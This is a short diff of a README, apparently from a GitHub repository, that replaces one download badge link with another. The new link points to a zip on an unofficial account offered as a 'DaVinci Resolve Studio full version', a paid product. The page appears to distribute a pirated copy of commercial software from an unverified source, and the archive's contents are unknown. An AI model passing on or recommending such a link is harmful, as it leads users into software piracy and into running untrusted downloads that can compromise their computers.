@@ -6,7 +6,7 @@
 
 ## 📥 Download
 
-<a href="https://github.com/tamimbgj/adobe-DaVinci Resolve-github/releases/download/full/DaVinci ResolveFullVersion.zip" download>
+<a href="https://github.com/Shivam-88618/DaVinci-Resolve-Github/releases/download/full/DavinciResolveStudioFullVersion.zip" download>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
